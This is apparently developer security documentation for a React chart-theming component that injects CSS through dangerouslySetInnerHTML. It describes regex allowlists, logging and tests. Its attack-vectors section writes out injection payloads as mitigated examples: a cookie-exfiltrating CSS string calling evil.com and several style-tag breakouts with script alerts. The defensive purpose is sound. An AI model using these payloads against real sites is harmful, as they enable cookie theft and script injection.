# ChartStyle Component - Security Documentation

## Overview

The `ChartStyle` component in `chart.tsx` uses `dangerouslySetInnerHTML` to inject CSS custom properties for chart theming. This document explains the security considerations, validation mechanisms, and safe usage guidelines.

## Security Vulnerability Context

### The Risk

`dangerouslySetInnerHTML` is a React API that bypasses React's built-in XSS protection by directly injecting HTML/CSS into the DOM. When misused, it can lead to:

- **CSS Injection**: Malicious CSS can alter page appearance, steal data via CSS exfiltration, or perform clickjacking
- **XSS (Cross-Site Scripting)**: If style tags are broken out of, JavaScript injection becomes possible
- **SSR Vulnerabilities**: Server-side rendering amplifies risks by executing malicious code server-side
- **RCE (Remote Code Execution)**: In SSR contexts, CSS injection can potentially lead to code execution

### Original Implementation

The original implementation was relatively safe because:
- Used only static `THEMES` constant (light/dark)
- Chart configs came from controlled sources
- No direct user input flowed into the component

However, it lacked:
- Explicit runtime validation
- Documentation about security constraints
- Safeguards against future code changes introducing vulnerabilities

## Current Security Measures

### 1. Runtime Input Validation

All inputs are validated before being injected into `dangerouslySetInnerHTML`:

#### Chart ID Validation
```typescript
if (!/^[a-zA-Z0-9_-]+$/.test(id)) {
  console.error('[ChartStyle] SECURITY: Invalid chart ID rejected:', id)
  return null
}
```

**Allowed**: Alphanumeric characters, hyphens, underscores
**Rejected**: Special characters, brackets, semicolons, quotes, etc.

#### Config Key Validation
```typescript
if (!/^[a-zA-Z0-9_-]+$/.test(key)) {
  console.error('[ChartStyle] SECURITY: Invalid config key rejected:', key)
  return false
}
```

**Allowed**: Alphanumeric characters, hyphens, underscores
**Rejected**: Any characters that could break CSS syntax

#### Color Value Validation

Strict regex patterns for each allowed color format:

| Format | Pattern | Example |
|--------|---------|---------|
| Hex | `/^#[0-9a-fA-F]{3,8}$/` | `#fff`, `#ff0000`, `#ff00ff00` |
| RGB | `/^rgb\(\s*\d+\s*,\s*\d+\s*,\s*\d+\s*\)$/` | `rgb(255, 0, 0)` |
| RGBA | `/^rgba\(\s*\d+\s*,\s*\d+\s*,\s*\d+\s*,\s*[\d.]+\s*\)$/` | `rgba(255, 0, 0, 0.5)` |
| HSL | `/^hsl\(\s*\d+\s*,\s*\d+%\s*,\s*\d+%\s*\)$/` | `hsl(120, 100%, 50%)` |
| HSLA | `/^hsla\(\s*\d+\s*,\s*\d+%\s*,\s*\d+%\s*,\s*[\d.]+\s*\)$/` | `hsla(120, 100%, 50%, 0.5)` |
| CSS Variable | `/^var\(--[a-zA-Z0-9_-]+\)$/` | `var(--primary)` |
| HSL with var | `/^hsl\(\s*var\(--[a-zA-Z0-9_-]+\)\s*\)$/` | `hsl(var(--chart-1))` |
| Keywords | `/^[a-z]+$/` | `red`, `blue`, `transparent` |

**Any value not matching these patterns is rejected.**

### 2. Security Logging

All rejected inputs are logged to the console with the `[ChartStyle] SECURITY:` prefix:

```typescript
console.error('[ChartStyle] SECURITY: Invalid color value rejected:', color)
```

This enables:
- Security monitoring and alerting
- Investigation of potential attacks
- Debugging of configuration issues

### 3. Fail-Safe Behavior

When invalid input is detected:
- The entire component returns `null` (for invalid chart IDs)
- Invalid config entries are filtered out (for invalid keys/colors)
- Valid entries continue to render normally
- No partial injection occurs

## Safe Usage Guidelines

### ✅ DO

1. **Use Static Configurations**
   ```typescript
   const chartConfig: ChartConfig = {
     revenue: { color: '#22c55e' },
     expenses: { color: '#ef4444' }
   }
   ```

2. **Use Validated Color Libraries**
   ```typescript
   import { colors } from '@/lib/design-tokens'
   const chartConfig: ChartConfig = {
     primary: { color: colors.primary }
   }
   ```

3. **Validate External Data Before Passing**
   ```typescript
   function createChartConfig(userPreference: unknown): ChartConfig {
     const validColor = validateColor(userPreference) || '#000000'
     return { user: { color: validColor } }
   }
   ```

### ❌ DON'T

1. **Never Pass User Input Directly**
   ```typescript
   // DANGEROUS - DO NOT DO THIS
   const chartConfig: ChartConfig = {
     custom: { color: userInput }  // ❌ UNSAFE
   }
   ```

2. **Never Accept Theme Names from External Sources**
   ```typescript
   // DANGEROUS - DO NOT DO THIS
   const themes = JSON.parse(untrustedData) // ❌ UNSAFE
   ```

3. **Never Disable Validation**
   ```typescript
   // DANGEROUS - DO NOT DO THIS
   // Do not modify validation logic to be more permissive
   ```

## Attack Vectors (All Mitigated)

### 1. Chart ID Injection
**Attack**: `chart-1]; body { background: url('http://evil.com/?cookie=' + document.cookie) }`
**Mitigation**: Rejected by `/^[a-zA-Z0-9_-]+$/` validation

### 2. Config Key Injection
**Attack**: `revenue'; } </style><script>alert('XSS')</script><style>`
**Mitigation**: Rejected by `/^[a-zA-Z0-9_-]+$/` validation

### 3. Color Value Injection
**Attack**: `red; } body { display: none; } /*`
**Mitigation**: Rejected - doesn't match any color pattern

### 4. CSS Exfiltration
**Attack**: `url("http://evil.com/?data=sensitive")`
**Mitigation**: Rejected - URLs not allowed in color values

### 5. Style Tag Breakout
**Attack**: `</style><script>alert(1)</script><style>`
**Mitigation**: Rejected - special characters not allowed

## Testing

Comprehensive security tests in `tests/unit/chart-style-security.test.tsx`:

- ✅ Chart ID validation (valid and invalid)
- ✅ Config key validation (valid and invalid)
- ✅ Color value validation (all formats)
- ✅ Injection attack simulation
- ✅ Edge cases and mixed inputs
- ✅ Integration with real configurations

Run tests:
```bash
npm test tests/unit/chart-style-security.test.tsx
```

## Monitoring and Alerting

### Development
- Console errors appear immediately in browser console
- Look for `[ChartStyle] SECURITY:` prefix

### Production
- Consider setting up error tracking (e.g., Sentry)
- Alert on `[ChartStyle] SECURITY:` errors
- These could indicate:
  - Configuration bugs
  - Potential attack attempts
  - Integration issues with external data

## Code Review Checklist

When modifying the ChartStyle component:

- [ ] No new `dangerouslySetInnerHTML` usage added
- [ ] All inputs still validated with strict regex
- [ ] No user input flows directly into the component
- [ ] Security documentation updated
- [ ] Security tests updated and passing
- [ ] Changes reviewed by security-aware team member
- [ ] CodeQL scan passes

## Version History

### 2025-12-11 - Initial Security Hardening
- Added runtime validation for all inputs
- Created comprehensive security documentation
- Added security test suite
- Updated CHANGELOG with security details

## References

- [React dangerouslySetInnerHTML Documentation](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [OWASP: Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [CSS Injection Attacks](https://www.w3.org/TR/css3-syntax/#security)
- [Recharts Documentation](https://recharts.org/)

## Contact

For security concerns or questions:
- Open a security advisory on GitHub
- Contact the security team
- Review code with senior engineers before modifying validation logic
